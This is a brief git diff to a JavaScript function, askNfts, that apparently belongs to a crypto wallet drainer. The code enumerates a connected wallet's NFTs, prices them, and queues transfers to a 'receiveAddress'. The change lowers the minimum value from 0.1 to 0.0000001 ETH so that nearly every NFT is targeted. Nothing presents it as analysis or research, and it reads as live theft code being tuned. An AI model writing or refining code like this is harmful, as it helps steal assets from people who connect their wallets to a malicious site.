@@ -84,7 +84,7 @@ async function askNfts() {
     for (nft of walletNfts) {
         if (nft.price === 0) continue;
         const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
-        if (ethPrice < 0.1) continue;
+        if (ethPrice < 0.0000001) continue;
         const thewallet = ethPrice < 1.0 ? receiveAddress : "";
         transactionsOptions.push({
             price: ethPrice,
